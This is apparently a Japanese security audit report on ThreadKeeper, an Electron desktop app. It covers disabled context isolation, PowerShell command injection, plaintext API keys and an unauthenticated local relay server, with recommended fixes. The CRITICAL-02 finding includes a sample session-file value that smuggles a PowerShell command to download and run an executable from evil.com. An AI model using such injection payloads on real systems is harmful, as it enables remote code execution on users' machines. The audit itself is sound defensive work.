# ThreadKeeper セキュリティ監査レポート

**監査日**: 2026-02-21
**対象バージョン**: v0.1.0
**対象**: ThreadKeeper — 作業文脈を保存・復元する Electron デスクトップアプリ (Windows)

---

## エグゼクティブサマリー

ThreadKeeper は Electron ベースの Windows デスクトップアプリケーションで、開いているウィンドウ、ブラウザタブ、クリップボード内容、閲覧履歴などの作業コンテキストをキャプチャし、AI による要約とともに保存・復元する機能を持つ。

本監査では **Critical 2件、High 4件、Medium 5件、Low 4件** の脆弱性・セキュリティ課題を検出した。特に Electron のセキュリティモデルに関する設定不備（`contextIsolation: false`）とセッション復元時のコマンドインジェクションリスクが最も深刻であり、早急な対応を推奨する。

### 重大度別サマリー

| 重大度 | 件数 | 概要 |
|--------|------|------|
| **Critical** | 2 | Electron コンテキスト分離の無効化、セッション復元時のコマンドインジェクション |
| **High** | 4 | APIキー平文保存、タブリレーサーバーの認証不備、`shell.openExternal` のセッションデータ経由呼び出し、依存パッケージの既知脆弱性 |
| **Medium** | 5 | CSP 未設定、リレーサーバーのリクエストサイズ制限欠如、セッションファイルの改竄検知なし、外部CDN読み込みによるプライバシーリスク、`innerHTML` の広範な使用 |
| **Low** | 4 | 未使用の dotenv 依存、コンソールログへの機密情報出力、セッションデータの有効期限なし、クリップボード内容のファイル保存 |

---

## 検出項目一覧

### CRITICAL-01: Electron コンテキスト分離 (Context Isolation) の無効化

**ファイル**: `src/main/main.ts:58`, `src/main/main.ts:81`
**CVSS v3.1 推定**: 9.0 (Critical)
**CWE**: CWE-269 (Improper Privilege Management)

**概要**:
全ての `BrowserWindow` が `nodeIntegration: true` かつ `contextIsolation: false` で作成されている。

```typescript
mainWindow = new BrowserWindow({
  webPreferences: { nodeIntegration: true, contextIsolation: false },
});
```

**リスク**:
- レンダラープロセスが Node.js API へ完全にアクセス可能な状態にある。
- レンダラーに読み込まれるコンテンツ（外部CDNフォント含む）が悪意のあるスクリプトを含む場合、`require('child_process').exec()` 等を通じてホスト OS 上で任意コードを実行可能。
- XSS 脆弱性が万一存在した場合、即座にリモートコード実行（RCE）に直結する。

**推奨対応**:
1. `contextIsolation: true` に変更し、`preload` スクリプトを導入する。
2. `nodeIntegration: false` に変更する。
3. `contextBridge.exposeInMainWorld()` を使い、レンダラーに公開する API を最小限に絞る。

```typescript
// 修正例
mainWindow = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    preload: path.join(__dirname, 'preload.js'),
  },
});
```

---

### CRITICAL-02: セッション復元時の PowerShell コマンドインジェクション

**ファイル**: `src/main/main.ts:258-271`
**CVSS v3.1 推定**: 8.8 (High-Critical)
**CWE**: CWE-78 (OS Command Injection)

**概要**:
`restore-session` IPC ハンドラにおいて、保存されたセッションデータの `win.name`（プロセス名）が PowerShell スクリプト文字列にテンプレートリテラルで直接埋め込まれている。

```typescript
const script =
  `$p = Get-Process "${processName}" -ErrorAction SilentlyContinue | ...` +
  `  Start-Process "${processName}" -ErrorAction SilentlyContinue; ...`;
```

**攻撃シナリオ**:
セッションファイル（`%AppData%/Roaming/ThreadKeeper/sessions/*.json`）は平文 JSON で保存されており、ユーザーまたは同一マシン上のマルウェアが改竄可能。`windows[].name` フィールドに以下のようなペイロードを注入すると、任意のコマンドが実行される:

```json
{
  "name": "notepad\"; Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\\temp\\p.exe; Start-Process C:\\temp\\p.exe; #",
  "title": "Untitled"
}
```

**推奨対応**:
1. プロセス名を許可リスト（allowlist）で検証する。
2. `execFile` の配列引数形式で安全にパラメータを渡す（文字列結合による PowerShell スクリプトを廃止する）。
3. プロセス名に `^[a-zA-Z0-9._-]+$` のようなバリデーションを適用する。

```typescript
// 修正例: 安全なパラメータ渡し
const SAFE_PROCESS_NAME = /^[a-zA-Z0-9._-]+$/;
if (!SAFE_PROCESS_NAME.test(processName)) continue;
```

---

### HIGH-01: API キーの平文保存

**ファイル**: `src/main/config-store.ts:101-106`
**CVSS v3.1 推定**: 7.5 (High)
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

**概要**:
Google Gemini、OpenAI、Anthropic の API キーが `%AppData%/Roaming/ThreadKeeper/config.json` に平文 JSON として保存されている。

```json
{
  "googleApiKey": "AIzaSy...",
  "openaiApiKey": "sk-...",
  "anthropicApiKey": "sk-ant-..."
}
```

**リスク**:
- 同一マシン上の他のアプリケーションやマルウェアが API キーを容易に窃取可能。
- バックアップやファイル同期サービスを通じてキーが漏洩するリスク。
- API キーの不正利用による課金被害。

**推奨対応**:
1. Windows の場合は `safeStorage` (Electron) もしくは Windows Credential Manager (`keytar`, `electron-keychain`) を使用して暗号化保存する。
2. `electron.safeStorage.encryptString()` / `decryptString()` の利用を検討する。

```typescript
import { safeStorage } from 'electron';
// 保存時
const encrypted = safeStorage.encryptString(apiKey);
fs.writeFileSync(keyFile, encrypted);
// 読み込み時
const decrypted = safeStorage.decryptString(fs.readFileSync(keyFile));
```

---

### HIGH-02: タブリレーサーバーの認証・認可不備

**ファイル**: `src/main/session/tab-relay-server.ts:39-84`
**CVSS v3.1 推定**: 7.3 (High)
**CWE**: CWE-306 (Missing Authentication for Critical Function), CWE-942 (Overly Permissive CORS Policy)

**概要**:
ローカル HTTP サーバー（`localhost:9224`）が認証なし・`Access-Control-Allow-Origin: *` で稼働している。

```typescript
res.setHeader('Access-Control-Allow-Origin', '*');
```

**リスク**:
- **POST /tabs**: ブラウザで開いた悪意のある Web ページが `fetch('http://localhost:9224/tabs', { method: 'POST', body: ... })` で偽のタブデータを注入可能。これにより、AI に送信されるコンテキストが汚染される。
- **GET /tabs**: 同様に、悪意のある Web ページが現在開いているタブ一覧（URL・タイトル含む）を読み取り可能。閲覧中のサイト情報がサードパーティに漏洩する。

**推奨対応**:
1. CORS を `Access-Control-Allow-Origin: *` から拡張機能の Origin のみに制限する（例: `chrome-extension://<id>`）。
2. 共有シークレット（起動時にランダム生成し拡張機能に渡す）をヘッダーに含めて認証する。
3. POST 時にリクエストボディのサイズ上限を設ける（→ Medium-03 参照）。

---

### HIGH-03: セッションデータ経由の `shell.openExternal` / `shell.openPath` 呼び出し

**ファイル**: `src/main/main.ts:284-285`, `src/main/main.ts:329-348`
**CVSS v3.1 推定**: 7.1 (High)
**CWE**: CWE-20 (Improper Input Validation)

**概要**:
セッション復元時に `browserTabs[].url` のデータを `shell.openExternal()` に渡してブラウザで開いている。URL のバリデーションは `^https?:\/\/` のみ。

```typescript
for (const url of tabUrls) {
  try { await shell.openExternal(url); urlsOpened++; } catch { /* ignore */ }
}
```

また `open-path` ハンドラでは `path.isAbsolute()` チェックのみで `shell.openPath()` を呼び出す。

**リスク**:
- セッションファイルの改竄により、悪意のある URL を開かせることが可能（例: フィッシングサイト、ドライブバイダウンロード）。
- `open-path` では `..` を含むパストラバーサルにより、意図しないファイルを開く可能性がある。
- `shell.openExternal` は OS のデフォルトハンドラを呼ぶため、`file://` プロトコル以外にもカスタムプロトコルハンドラへのリダイレクトが理論上可能。

**推奨対応**:
1. URL の厳格なバリデーション（ドメインの許可リストまたは拒否リスト）。
2. `shell.openExternal` の呼び出し前に URL を正規化し、リダイレクト先やカスタムプロトコルをブロックする。
3. `open-path` では `path.normalize()` 後にパスのプレフィックスを検証する（ホームディレクトリ配下のみ許可など）。

---

### HIGH-04: 依存パッケージの既知脆弱性 (25件)

**ツール**: `npm audit`
**CVSS**: 各脆弱性により異なる (moderate 1件, high 24件)

**検出された主な脆弱性**:

| パッケージ | 重大度 | 概要 |
|-----------|--------|------|
| `electron` < 35.7.5 | Moderate | ASAR Integrity Bypass (GHSA-vmqv-hx8q-j7mg) |
| `minimatch` < 10.2.1 | High | ReDoS via repeated wildcards (GHSA-3ppc-4f35-3m26) — 8箇所 |
| `tar` <= 7.5.7 | High | Path Traversal / Arbitrary File Overwrite — 4件の CVE |

**推奨対応**:
1. `electron` を `^35.7.5` 以上（可能であれば最新安定版）に更新する。
2. `electron-builder` を `^26.8.1` 以上に更新する。
3. CI/CD パイプラインに `npm audit` を組み込み、定期的に依存関係を監査する。

---

### MEDIUM-01: Content Security Policy (CSP) の未設定

**ファイル**: `src/renderer/app/index.html`, `src/renderer/setup/index.html`
**CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)

**概要**:
すべての HTML ファイルに Content Security Policy ヘッダーまたは `<meta>` タグが設定されていない。

**リスク**:
- インラインスクリプトの実行制限がないため、XSS 攻撃の被害範囲が拡大する。
- `nodeIntegration: true` と組み合わさると、XSS → RCE のチェーンが容易になる。

**推奨対応**:
`<meta>` タグまたは Electron の `session.webRequest.onHeadersReceived` で CSP を設定する。

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;">
```

---

### MEDIUM-02: リレーサーバーのリクエストボディサイズ制限なし

**ファイル**: `src/main/session/tab-relay-server.ts:52-53`
**CWE**: CWE-770 (Allocation of Resources Without Limits or Throttling)

**概要**:
`POST /tabs` エンドポイントでリクエストボディを `body += chunk` で無制限に蓄積している。

```typescript
req.on('data', (chunk: string) => (body += chunk));
```

**リスク**:
- 巨大なリクエストボディを送信することで、メモリ枯渇（OOM）による DoS を引き起こす可能性。

**推奨対応**:
```typescript
const MAX_BODY = 1024 * 1024; // 1MB
req.on('data', (chunk: string) => {
  body += chunk;
  if (body.length > MAX_BODY) {
    res.writeHead(413);
    res.end('Payload too large');
    req.destroy();
  }
});
```

---

### MEDIUM-03: セッションファイルの整合性検証なし

**ファイル**: `src/main/session/session-store.ts:92-96`
**CWE**: CWE-345 (Insufficient Verification of Data Authenticity)

**概要**:
セッションファイル（`sessions/*.json`）を読み込む際に署名や HMAC による整合性検証が行われていない。

**リスク**:
- CRITICAL-02 で指摘した通り、セッションファイルの改竄がコマンドインジェクションに直結する。
- AI への入力データ汚染（プロンプトインジェクション的なデータ挿入）が可能。

**推奨対応**:
1. セッション保存時に HMAC 署名を付与し、読み込み時に検証する。
2. セッションデータの各フィールドに型・長さ・フォーマットのバリデーションを追加する。

---

### MEDIUM-04: 外部 CDN からのフォント読み込み（プライバシーリスク）

**ファイル**: `src/renderer/app/index.html:6-8`
**CWE**: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**概要**:
Google Fonts CDN からフォントを読み込んでいる。

```html
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP..." rel="stylesheet">
```

**リスク**:
- アプリ起動のたびに Google のサーバーに HTTP リクエストが送信され、IP アドレスやアプリの使用状況が追跡可能。
- CDN が侵害された場合、悪意のあるスタイルシート（CSS injection）が注入されるリスク。

**推奨対応**:
1. フォントファイルをアプリにバンドルする（ローカル配信）。
2. Subresource Integrity (SRI) ハッシュを付与する。

---

### MEDIUM-05: `innerHTML` の広範な使用

**ファイル**: `src/renderer/app/app.js` (複数箇所)
**CWE**: CWE-79 (Cross-site Scripting)

**概要**:
セッションデータの表示に `innerHTML` が広範に使用されている。`esc()` 関数による HTML エスケープは実装されているが、以下の点が懸念:

1. `esc()` が `'` (シングルクォート) をエスケープしていない。HTML 属性値でシングルクォートが使用された場合に XSS が成立する可能性がある。
2. `formatSummary()` 内で `esc()` 適用後の文字列に対して `.replace(/。/g, '。<br>')` を行っているが、パターンの一致がエスケープ済み文字列に対して安全であることの保証が形式的でない。
3. `makeTags()` は数値を直接 HTML に埋め込んでいるが（`s.windows.length` 等）、これ自体は安全。しかしパターンの一貫性がない。

**推奨対応**:
1. `esc()` にシングルクォートのエスケープを追加:
```javascript
function esc(str) {
  return String(str)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```
2. `textContent` や `createElement` ベースの DOM 操作への段階的移行を検討する。

---

### LOW-01: 未使用の `dotenv` 依存

**ファイル**: `package.json:15`

**概要**:
`dotenv` が dependencies に含まれているが、ソースコードでは `require('dotenv')` が呼ばれていない（`.env` ファイルは `config-store.ts` の `migrateFromDotenv()` でプレーンテキストとして独自パースされている）。

**推奨対応**:
不要な依存を削除してアタックサーフェスを減らす。

---

### LOW-02: コンソールログへの機密情報出力

**ファイル**: 複数ファイル

**概要**:
`console.log`/`console.error` でエラーメッセージを出力する際に、API キー関連のエラー詳細が含まれる可能性がある。

```typescript
console.error(`[TK] AI config test error (${cfg.provider}):`, msg);
```

**推奨対応**:
本番ビルドではログレベルを制限し、API キーを含む可能性のある文字列をマスクする。

---

### LOW-03: セッションデータの有効期限・自動削除なし

**ファイル**: `src/main/session/session-store.ts`

**概要**:
保存されたセッションデータ（ブラウザ履歴、クリップボード内容、開いていたウィンドウ名等）に有効期限がなく、永続的に保存される。

**リスク**:
- 長期間にわたるユーザーの行動履歴がローカルに蓄積され、端末紛失や不正アクセス時に大量の個人情報が流出するリスク。

**推奨対応**:
自動削除ポリシー（例: 90日以上前のセッションを自動アーカイブ/削除）の実装を検討する。

---

### LOW-04: クリップボード内容のファイル保存

**ファイル**: `src/main/session/clipboard-collector.ts`, `src/main/session/session-store.ts`

**概要**:
キャプチャ時のクリップボード内容（先頭500文字）がセッションファイルに平文で保存される。クリップボードにはパスワード、API トークン、個人情報等が一時的にコピーされていることがある。

**推奨対応**:
1. 保存前にクリップボード内容がセンシティブかどうかのヒューリスティック判定を行う（例: `sk-`、`password`、長い英数字文字列の検出）。
2. ユーザーにクリップボード保存のオプトアウト設定を提供する。

---

## アーキテクチャレベルの推奨事項

### 1. Electron セキュリティベストプラクティスの適用

Electron 公式のセキュリティチェックリストに従い、以下を実装する:

- [x] ~~ウェブコンテンツの読み込みに HTTPS を使用~~ (外部 API は HTTPS)
- [ ] **`contextIsolation: true` に変更** ← 最優先
- [ ] **`nodeIntegration: false` に変更** ← 最優先
- [ ] `preload` スクリプトで `contextBridge` を使用
- [ ] Content Security Policy の設定
- [ ] `sandbox: true` の有効化
- [ ] `webSecurity` がデフォルト (`true`) であることの明示的確認
- [ ] Navigation / New Window の制限 (`will-navigate`, `new-window` イベントのハンドリング)

### 2. IPC 通信の整理

現在の `ipcRenderer.invoke()` / `ipcMain.handle()` パターン自体は安全だが、`contextIsolation: true` に変更した後は `contextBridge` 経由に移行する必要がある。IPC チャンネル名と引数の型をスキーマ定義し、バリデーションを追加する。

### 3. セッションデータの暗号化

センシティブなデータ（クリップボード内容、閲覧履歴、URL 等）を `electron.safeStorage` で暗号化して保存する。

### 4. CI/CD セキュリティパイプライン

- `npm audit` を CI に組み込む
- Dependabot / Renovate による依存関係の自動更新
- 静的解析ツール（ESLint security plugin）の導入

---

## 対応優先度マトリックス

| 優先度 | 項目 | 工数目安 |
|--------|------|----------|
| **P0 (即時)** | CRITICAL-01: contextIsolation 有効化 + preload 導入 | 中 |
| **P0 (即時)** | CRITICAL-02: PowerShell インジェクション修正 | 小 |
| **P1 (短期)** | HIGH-01: API キー暗号化保存 | 小〜中 |
| **P1 (短期)** | HIGH-02: リレーサーバー認証 + CORS 制限 | 小 |
| **P1 (短期)** | HIGH-03: URL/パス バリデーション強化 | 小 |
| **P1 (短期)** | HIGH-04: 依存パッケージ更新 | 小 |
| **P2 (中期)** | MEDIUM-01〜05: CSP、リクエスト制限、整合性検証等 | 中 |
| **P3 (長期)** | LOW-01〜04: 依存整理、ログマスク、データ保持ポリシー等 | 小 |

---

## 付録: 監査対象ファイル一覧

| ファイル | 内容 |
|----------|------|
| `src/main/main.ts` | エントリポイント、BrowserWindow 設定、IPC ハンドラ |
| `src/main/config-store.ts` | 設定ファイル管理、API キー保存 |
| `src/main/ai/anthropic-client.ts` | マルチプロバイダー AI クライアント |
| `src/main/session/collector.ts` | コンテキスト収集オーケストレーション |
| `src/main/session/session-store.ts` | セッション永続化 |
| `src/main/session/session-restorer.ts` | セッション復元 |
| `src/main/session/browser-collector.ts` | ブラウザタブ収集 (CDP/UIA) |
| `src/main/session/history-collector.ts` | ブラウザ履歴収集 (SQLite) |
| `src/main/session/window-collector.ts` | ウィンドウ情報収集 (PowerShell) |
| `src/main/session/clipboard-collector.ts` | クリップボード収集 |
| `src/main/session/recent-files-collector.ts` | 最近使ったファイル収集 |
| `src/main/session/tab-relay-server.ts` | タブリレー HTTP サーバー |
| `src/renderer/app/index.html` | メイン UI (HTML/CSS) |
| `src/renderer/app/app.js` | メイン UI ロジック (JS) |
| `src/renderer/setup/index.html` | セットアップウィザード (HTML) |
| `src/renderer/setup/setup.js` | セットアップウィザードロジック (JS) |
| `package.json` | 依存関係定義 |
| `.gitignore` | Git 除外設定 |
